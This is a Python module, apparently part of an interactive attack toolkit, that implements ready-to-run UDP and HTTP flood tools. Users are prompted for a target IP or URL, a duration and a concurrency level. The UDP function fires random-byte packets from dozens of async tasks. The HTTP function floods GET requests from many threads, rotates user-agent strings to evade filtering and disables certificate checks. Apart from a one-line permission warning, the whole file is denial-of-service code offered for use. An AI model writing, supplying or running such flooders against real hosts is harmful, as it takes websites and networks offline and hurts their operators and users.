"""
ATTACK – Real UDP & HTTP flood tools.
WARNING: Use only on systems you own or have permission to test.
"""
import time
import random
import socket
import asyncio
import threading
from rich.prompt import Prompt, IntPrompt

async def udp_flood_async(target_ip, target_port, duration, tasks=50, packet_size=1024, delay=0.001):
    """Async UDP flood with multiple tasks."""
    stop = asyncio.Event()
    sent = 0
    lock = asyncio.Lock()

    async def sender():
        nonlocal sent
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        while not stop.is_set():
            try:
                payload = random._urandom(packet_size)
                sock.sendto(payload, (target_ip, target_port))
                async with lock:
                    sent += 1
                await asyncio.sleep(delay)
            except:
                await asyncio.sleep(delay * 2)
        sock.close()

    workers = [asyncio.create_task(sender()) for _ in range(tasks)]
    await asyncio.sleep(duration)
    stop.set()
    await asyncio.gather(*workers, return_exceptions=True)
    return sent

def udp_flood():
    target = Prompt.ask("[cyan]Enter target IP[/cyan]")
    port = IntPrompt.ask("[cyan]Enter target port[/cyan]", default=80)
    duration = IntPrompt.ask("[cyan]Enter duration (seconds)[/cyan]", default=10)
    tasks = IntPrompt.ask("[cyan]Concurrent tasks (default 50)[/cyan]", default=50)
    size = IntPrompt.ask("[cyan]Packet size (default 1024)[/cyan]", default=1024)
    delay = float(Prompt.ask("[cyan]Delay between packets (seconds, default 0.001)[/cyan]", default="0.001"))
    print(f"[yellow]Launching UDP flood on {target}:{port} for {duration}s...[/yellow]")
    sent = asyncio.run(udp_flood_async(target, port, duration, tasks, size, delay))
    print(f"[green]Sent {sent} packets.[/green]")
    input("Press Enter to return...")

def http_flood():
    import requests
    target = Prompt.ask("[cyan]Enter target URL (http:// or https://)[/cyan]")
    duration = IntPrompt.ask("[cyan]Enter duration (seconds)[/cyan]", default=10)
    threads = IntPrompt.ask("[cyan]Concurrent threads (default 20)[/cyan]", default=20)
    delay = float(Prompt.ask("[cyan]Delay between requests per thread (default 0.01)[/cyan]", default="0.01"))

    stop = threading.Event()
    req_count = 0
    lock = threading.Lock()
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14) Chrome/120.0"
    ]

    def worker():
        nonlocal req_count
        sess = requests.Session()
        sess.verify = False
        while not stop.is_set():
            try:
                sess.get(target, timeout=3, headers={"User-Agent": random.choice(ua_list)})
                with lock:
                    req_count += 1
                time.sleep(delay + random.uniform(0, delay * 0.5))
            except:
                time.sleep(delay * 2)

    print(f"[yellow]HTTP flood on {target} for {duration}s...[/yellow]")
    workers = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        workers.append(t)
    time.sleep(duration)
    stop.set()
    for t in workers:
        t.join()
    print(f"[green]Sent {req_count} requests.[/green]")
    input("Press Enter to return...")

TOOLS = {
    "UDP Flood": udp_flood,
    "HTTP Flood": http_flood,
}